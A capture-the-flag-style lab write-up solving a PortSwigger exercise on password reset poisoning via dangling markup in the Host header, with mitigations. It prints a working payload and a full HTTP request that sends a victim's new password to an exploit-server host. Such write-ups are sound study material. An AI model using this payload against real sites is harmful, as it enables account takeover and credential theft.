# 🧪 Lab: Password Reset Poisoning via Dangling Markup

> **Difficulty:** Expert  
> **Category:** HTTP Host Header Attacks  
> **Platform:** PortSwigger Web Security Academy

---

## 📋 Overview

This lab demonstrates a **Password Reset Poisoning** attack using a **Dangling Markup Injection** technique. The attacker poisons the Host header of a password reset request to inject a partial HTML tag that "dangles" open — causing the victim's email client to leak the plaintext password to an attacker-controlled server.

---

## 🎯 Objective

Log in to **Carlos's account** by stealing his newly-reset password through a dangling markup injection in the Host header of the password reset flow.

---

## 🔑 Credentials

| Account | Username | Password |
|---------|----------|----------|
| Your account | `wiener` | `peter` |
| Target account | `carlos` | *(to be stolen)* |

---

## 🧠 Vulnerability Summary

| Property | Detail |
|----------|--------|
| **Vulnerability** | Password Reset Poisoning via Dangling Markup |
| **Attack Vector** | HTTP Host Header Injection |
| **Root Cause** | Unsanitized Host header reflected in reset email HTML |
| **Impact** | Account takeover (full authentication bypass) |
| **Affected Endpoint** | `POST /forgot-password` |

---

## 🔍 How It Works

1. The `/forgot-password` endpoint uses the `Host` header to construct a URL inside the password reset email.
2. The server accepts **arbitrary ports** appended to the host (e.g., `host:arbitraryport`), and reflects this value unescaped in the email body inside a single-quoted HTML attribute.
3. By injecting a payload into the port section, the attacker can **break out of the attribute** and insert a dangling `<a href="...` tag.
4. The dangling open `href` causes the **email client to treat everything following it** — including the plaintext password — as part of the URL.
5. When the victim views the raw email (or it auto-loads), their browser sends a **GET request to the attacker's server** containing the stolen password in the URL path.

---

## 🧩 Step-by-Step Solution

### Step 1 — Understand the Normal Flow
- Log in as `wiener:peter`
- Request a password reset via `POST /forgot-password`
- Check the email client on the exploit server — notice the email contains a **new plaintext password** (no token-based reset link)

### Step 2 — Identify the Injection Point
- In Burp Suite, find the `POST /forgot-password` request
- Try modifying the `Host` header — a non-standard domain causes a **server error**
- However, appending an **arbitrary port** works fine:
  ```
  Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport
  ```
- Check the raw HTML of the received email — the injected port appears **unescaped inside a single-quoted string**

### Step 3 — Craft the Dangling Markup Payload
Break out of the attribute string and inject an open `<a href=` tag pointing to your exploit server:

```
Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
```

> ⚠️ The `<a href="` tag is intentionally left **unclosed**. This causes the email client to treat everything after `?` — including the new password — as part of the URL query string.

### Step 4 — Trigger for Your Own Account First (Test)
- Send the poisoned request with `username=wiener`
- Check the exploit server **access log**
- You should see a `GET` request like:
  ```
  GET /?/login'>[...password here...]
  ```

### Step 5 — Attack Carlos
- Resend the poisoned `POST /forgot-password` request, changing:
  ```
  username=carlos
  ```
- Refresh the exploit server access log
- Extract Carlos's new password from the log entry

### Step 6 — Log In as Carlos
- Navigate to the login page
- Enter `carlos` and the stolen password
- ✅ Lab solved!

---

## 📦 Payload Reference

```
Host: <LAB-ID>.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER.exploit-server.net/?
```

```http
POST /forgot-password HTTP/1.1
Host: <LAB-ID>.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER.exploit-server.net/?
Content-Type: application/x-www-form-urlencoded

username=carlos
```

---

## 🛡️ Mitigations

| Fix | Description |
|-----|-------------|
| **Validate Host header** | Only accept known, whitelisted Host values on the server side |
| **Use absolute URLs from config** | Never construct URLs dynamically from user-supplied headers |
| **Sanitize email HTML** | HTML-encode all reflected values before inserting into email templates |
| **Avoid plaintext passwords in emails** | Use token-based reset links instead of sending new passwords via email |
| **Content Security Policy (CSP) on emails** | Limit what email clients can load automatically |

---

## 🔗 References

- [PortSwigger: HTTP Host header attacks](https://portswigger.net/web-security/host-header)
- [PortSwigger: Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
- [PortSwigger: Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)
